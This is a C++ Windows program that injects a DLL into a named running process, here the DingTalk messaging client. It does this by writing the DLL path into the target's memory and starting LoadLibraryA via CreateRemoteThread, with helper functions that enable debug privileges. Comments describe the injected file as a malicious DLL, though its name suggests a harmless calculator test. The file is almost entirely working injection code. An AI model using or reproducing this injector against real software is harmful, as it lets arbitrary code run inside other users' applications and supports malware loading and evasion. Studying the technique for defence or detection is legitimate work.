#include<Windows.h>
#include<iostream>
#include<tlhelp32.h>
using namespace std;


DWORD GetProcessPid(char *Processname);
BOOL InjectDllToProcess(DWORD Pid, char *Dll);
void PrivilegeEscalation();
BOOL EnableDebugPrivilege();

int main()
{
	// define name of target process and route of malicious dll file
	char TargetProcName[] = "DingTalk.exe";
	//char TargetProcName[] = "HostProc.exe";
	char InjectedDllPath[] = "C:\\Users\\Ronpa\\Desktop\\Calculator_Dll.dll";

	// search the Pid of target process
	DWORD TargetProID = GetProcessPid(TargetProcName);

	// Inject Dll to target process
	if (InjectDllToProcess(TargetProID, InjectedDllPath))
		cout << "Dll injection success" << endl;
	else
		cout << "Dll injection failed" << endl;
	system("pause");
	return 0;
}

DWORD GetProcessPid(char *Processname)
{
	HANDLE hProcessSnap = NULL;   //define snapshot
	DWORD ProcessID = 0;
	PROCESSENTRY32 pe32 = { 0 };
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);   //create snapshot of all process in system
	pe32.dwSize = sizeof(PROCESSENTRY32);
	if (hProcessSnap == (HANDLE)-1)
	{
		cout << "CreateToolhelp32Snapshot is Error" << endl;
		return 0;
	}

	if (Process32First(hProcessSnap, &pe32))
	{
		do
		{
			//cout << pe32.szExeFile << endl;
			if (!strcmp(Processname, pe32.szExeFile))
			{
				ProcessID = pe32.th32ProcessID;
				break;
			}
		} while (Process32Next(hProcessSnap, &pe32));
	}
	if (ProcessID)
		cout << "The Pid of " << Processname << " is " << ProcessID << endl;
	else
		cout << "Can not find the Pid of " << Processname << endl;
	CloseHandle(hProcessSnap);
	return ProcessID;
}

void PrivilegeEscalation()
{
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tp;
	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
	LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid);
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	tp.Privileges[0].Luid = luid;
	AdjustTokenPrivileges(hToken, 0, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
}

BOOL  EnableDebugPrivilege()
{
	HANDLE hToken;
	BOOL fOk = FALSE;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) //Get Token 
	{
		TOKEN_PRIVILEGES tp;
		tp.PrivilegeCount = 1;
		if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid))//Get Luid 
			printf("Can't lookup privilege value.\n");
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;//这一句很关键，修改其属性为SE_PRIVILEGE_ENABLED 
		if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL))//Adjust Token 
			printf("Can't adjust privilege value.\n");
		cout << GetLastError() << endl;
		fOk = (GetLastError() == ERROR_SUCCESS);
		CloseHandle(hToken);
	}
	return fOk;
}

BOOL InjectDllToProcess(DWORD Pid, char *Dll)
{
	HANDLE hProc = NULL;
	//PrivilegeEscalation();
	//if (EnableDebugPrivilege())
		//cout << "raise privilege successful" << endl;
	hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Pid);
	//hProc = OpenProcess(PROCESS_VM_OPERATION, FALSE, Pid);
	if(!hProc)
	{
		cout << "Fail to open process. "<<"Last Error Number is "<<GetLastError() << endl;
		return false;
	}
	// alloc memory in process for dll name
	LPVOID AllocMemory = VirtualAllocEx(hProc, NULL, lstrlen(Dll) + 1, MEM_COMMIT, PAGE_READWRITE);
	if (AllocMemory)
		cout << "Alloc memory successful" << endl;
	else
	{
		cout << "Fail to alloc memory. "<<"Last Error Number is "<<GetLastError() << endl;
		return false;
	}

	// write Dll route to process memory allocated;
	if (WriteProcessMemory(hProc, AllocMemory, Dll, lstrlen(Dll) + 1, NULL))
		cout << "Write memory successful" << endl;
	else
	{
		cout << "Fail to write memory" << endl;
		return false;
	}

	// Get address of 'LoadLibrary()', and set start address of thread.
	PTHREAD_START_ROUTINE pfnStartAddr = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryA");
	cout << "The LoadLibrary's Address is:" << pfnStartAddr << endl;

	// Create remote thread;
	HANDLE hRemoteThread = NULL;
	hRemoteThread = CreateRemoteThread(hProc, NULL, 0, pfnStartAddr, AllocMemory, 0, NULL);
	if (hRemoteThread == NULL)
	{
		cout << "Create Remote Thread Failed!" << endl;
		return false;
	}

	cout << "Create Remote Thread Success!" << endl;
	return true;
}
